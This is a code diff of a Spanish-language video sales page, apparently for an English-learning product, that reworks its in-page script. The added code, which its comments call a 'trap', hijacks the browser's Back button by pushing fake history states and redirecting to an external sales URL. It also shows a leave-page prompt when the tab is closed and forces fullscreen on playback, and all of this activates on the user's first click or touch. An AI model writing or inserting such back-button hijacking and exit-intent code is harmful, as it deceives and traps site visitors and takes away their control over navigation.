@@ -174,14 +174,43 @@
     </script>
 
     <script>
-        // -----------------------------------------------------------------------
-        // 🚨 CONFIGURACIÓN: PEGA TU URL DE REDIRECCIÓN AQUÍ ABAJO 🚨
-        // -----------------------------------------------------------------------
-        const URL_REDIRECCION = "https://evo-launch.agency/neuro-ingles/redirec"; // <--- ¡AQUÍ!
-        // -----------------------------------------------------------------------
+        // 1. CONFIGURACIÓN
+        var URL_REDIRECCION = "https://evo-launch.agency/neuro-ingles/redirec";
+        var hacksArmados = false; // Bandera para saber si ya activamos la trampa
+
+        // 2. FUNCIÓN PARA ARMAR LA TRAMPA (Se ejecuta al primer clic)
+        function armarTrampa() {
+            if (hacksArmados) return; // Si ya está armada, no hacer nada
+            hacksArmados = true;
+
+            // A. Hack Historial: Empujamos el estado actual AL FINAL DEL STACK
+            // Esto asegura que si dan atrás, el navegador detecte el cambio
+            if (window.history && window.history.pushState) {
+                window.history.pushState('forward', null, window.location.href);
+                window.history.pushState('forward', null, window.location.href);
+                
+                window.onpopstate = function(event) {
+                    // Si detectamos que retroceden, redirigimos
+                    window.location.href = URL_REDIRECCION;
+                };
+            }
+
+            // B. Hack Exit Intent (Cerrar Pestaña)
+            window.onbeforeunload = function(e) {
+                e = e || window.event;
+                // Mensaje estándar (los navegadores modernos ignoran el texto, pero muestran el popup)
+                if (e) { e.returnValue = '¿Estás seguro?'; }
+                return '¿Estás seguro?';
+            };
+        }
+
+        // 3. LISTENERS GLOBALES PARA ARMAR LA TRAMPA
+        // Cualquier interacción en la página activará los hacks
+        document.addEventListener('click', armarTrampa);
+        document.addEventListener('touchstart', armarTrampa);
 
 
-        // --- 1. FULLSCREEN INTELIGENTE (Detecta Play/Pause) ---
+        // --- LOGICA DE VIDEO Y FULLSCREEN ---
         const trigger = document.getElementById('fullscreen-trigger');
         const wrapper = document.getElementById('video-wrapper-dom');
         let smartPlayerInstance = null;
@@ -197,12 +226,13 @@
 
         // A. Clic inicial en la capa transparente
         trigger.addEventListener('click', function() {
-            enterFull(wrapper); // Forzar pantalla completa
-            trigger.style.display = 'none'; // Quitar la capa
-            if (smartPlayerInstance) smartPlayerInstance.play(); // Dar play
+            // Esto también cuenta como interacción, así que dispara armarTrampa() por propagación
+            enterFull(wrapper); 
+            trigger.style.display = 'none'; 
+            if (smartPlayerInstance) smartPlayerInstance.play();
         });
 
-        // B. Listeners del Player (Sincronización)
+        // B. Listeners del Player
         function initListeners() {
             smartPlayerInstance.on('play', () => {
                 if (!document.fullscreenElement) enterFull(wrapper);
@@ -215,7 +245,7 @@
             });
         }
 
-        // Helpers
+        // Helpers Fullscreen
         function enterFull(elem) {
             if (elem.requestFullscreen) elem.requestFullscreen().catch(e=>{});
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
@@ -227,32 +257,6 @@
                 else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
             }
         }
-
-
-        // --- 2. BACK-BUTTON HIJACK (Redirección al ir atrás) ---
-        // Inyectamos un estado falso en el historial. Al dar atrás, saltamos a la URL.
-        (function(window, location) {
-            history.pushState(null, document.title, location.href);
-            window.addEventListener('popstate', function(event) {
-                history.pushState(null, document.title, location.href);
-                // ¡AQUÍ OCURRE LA MAGIA!
-                location.href = URL_REDIRECCION;
-            });
-        })(window, location);
-
-
-        // --- 3. EXIT INTENT (Confirmación al cerrar pestaña) ---
-        let hasInteracted = false;
-        document.body.addEventListener('click', () => { hasInteracted = true; });
-        document.body.addEventListener('touchstart', () => { hasInteracted = true; });
-
-        window.addEventListener('beforeunload', function (e) {
-            if (hasInteracted) {
-                e.preventDefault();
-                e.returnValue = ''; // Muestra la alerta nativa del navegador
-            }
-        });
-
     </script>
 </body>
 </html>
